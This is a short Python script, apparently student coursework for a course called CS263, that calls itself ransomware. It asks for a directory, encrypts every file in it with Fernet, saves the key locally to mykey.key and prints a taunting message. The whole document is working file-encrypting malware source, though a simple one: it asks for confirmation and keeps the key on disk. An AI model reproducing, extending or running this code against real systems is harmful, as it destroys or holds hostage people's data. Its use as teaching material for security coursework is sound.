#!/usr/bin/env python3

# Credit youtube video(accessed on 29/11/2022): https: // www.youtube.com/watch?v = UtMMjXOlRQc
import os
from cryptography.fernet import Fernet
import sys

repeate='n'
#gathering files
gathered_files=[]
print('------------------------------------------------------')
print('------------THE WARWICK ETHICAL HACKER ---------------')
print('------------------------------------------------------')
print('--------------------RANSOMWARE------------------------')
print('------------------------------------------------------')

while repeate=='N' or repeate=='n' or (repeate!='yES' and repeate!='yeS' and repeate!='Y' and repeate!='Yes' and repeate!='YES' and repeate!='y' and repeate!='yes'):
    path = input("Enter file path to encrypt:\n")
    print('File content:')
    print(*os.listdir(path), sep="\n")
    repeate = input("Are you sure you want to encrypt this? Y/N:\n ", )
for file in os.listdir(path):
         # Ignore this file, the decryption file and the file containing the key
            if file == sys.argv[0] or file == "mykey.key" or file == "decrypt.py":
                continue
            file_path = os.path.join(path, file)
            #gather all the files from the inputed directory
            if os.path.isfile(file_path):
                gathered_files.append(file_path)
#generate public/encryption key
key=Fernet.generate_key()
#store key in file
with open("mykey.key","wb") as mykey:
    mykey.write(key)
#For every file 
for file in gathered_files:
    #copy its content
    with open(file,"rb") as thefile:
        file_content = thefile.read()
    #encrtypt contents
    encrypted_content= Fernet(key).encrypt(file_content)
    #Replace current content with the encrypted ones
    with open(file,"wb") as thefile:
        thefile.write(encrypted_content)
print('\n')
print('--------------------------------------------------------------------')
print('--------------------------------------------------------------------')
print("As part of my Coursework for CS263 I will encrypt all of your files. \n No hard feeling though:))")
print('--------------------------------------------------------------------')
print('--------------------------------------------------------------------')
